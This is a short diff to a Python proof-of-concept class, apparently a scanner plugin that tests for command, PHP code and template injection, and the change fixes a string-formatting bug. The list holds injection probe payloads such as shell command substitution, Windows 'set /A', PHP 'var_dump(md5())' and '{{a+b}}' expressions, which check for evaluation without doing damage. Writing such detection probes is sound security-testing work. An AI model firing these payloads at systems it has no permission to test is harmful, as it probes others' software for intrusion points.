@@ -37,7 +37,7 @@ class POC():
             {"cmd": "$(expr {} + {})".format(num1, num2), "show": num1_num2, "method": "a"},
             {"cmd": "&set /A {}+{}".format(num1, num2), "show": num1_num2, "method": "a"},
             {"cmd": "${@var_dump(md5(%s))};" % num1, "show": num1_md5, "method": "w"},
-            {"cmd": "{}*{}" % num1, "show": num1num2, "method": "w"},
+            {"cmd": "{}*{}".format(num1,num2), "show": num1num2, "method": "w"},
             {"cmd": "'-var_dump(md5(%s))-'" % num1, "show": num1_md5, "method": "w"},
             {"cmd": "/*1*/{{%s+%s}}" % (num1, num2), "show": num1_num2, "method": "w"},
             {"cmd": "${%s+%s}" % (num1, num2), "show": num1_num2, "method": "w"},
